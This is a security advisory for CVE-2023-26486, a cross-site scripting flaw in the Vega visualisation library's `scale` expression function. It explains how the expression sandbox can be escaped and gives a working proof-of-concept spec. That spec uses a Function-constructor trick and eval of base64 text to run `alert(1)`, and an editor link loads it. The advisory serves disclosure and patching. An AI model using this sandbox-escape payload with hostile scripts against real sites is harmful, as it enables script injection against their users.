# [M] Vega Expression Language `scale` expression function Cross Site Scripting

## Summary
Severity: Medium
Advisory: GHSA-4vq7-882g-wcg4
CVE: CVE-2023-26486
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2023-03-02
Source: https://github.com/advisories/GHSA-4vq7-882g-wcg4
Type: github-advisory

## Affected
- npm: `vega-functions` — affected >=0 <5.13.1
- npm: `vega` — affected >=0 <5.23.0

## Details
### Summary
The Vega `scale` expression function has the ability to call arbitrary functions with a single controlled argument. This can be exploited to escape the Vega expression sandbox in order to execute arbitrary JavaScript.

### Details

The [scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) expression function passes a user supplied argument `group` to [getScale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6), which is then used as if it were an internal context. The `context.scales[name].value` is accessed from `group` and called as a function back in `scale`.

### PoC
The following Vega definition can be used to demonstrate this issue executing the JavaScript code `alert(1);`
```json
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "data": [
    {
      "name": "XSS PoC",
      "values": [1],
      "transform": [
        {
          "type": "formula",
          "as": "amount",
          "expr": "scale('func', null,  {context: {scales: {func: {value: scale('func', 'eval(atob(\"YWxlcnQoMSk7\"))', {context: {scales: {func: {value: [].constructor.constructor}}}})}}}})"
        }
      ]
    }
  ]
}
```

This can be viewed in the Vega online IDE at https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA

## References
- https://github.com/vega/vega/security/advisories/GHSA-4vq7-882g-wcg4
- https://nvd.nist.gov/vuln/detail/CVE-2023-26486
- https://github.com/vega/vega
- https://github.com/vega/vega/releases/tag/v5.23.0
- https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37
- https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6
- https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA
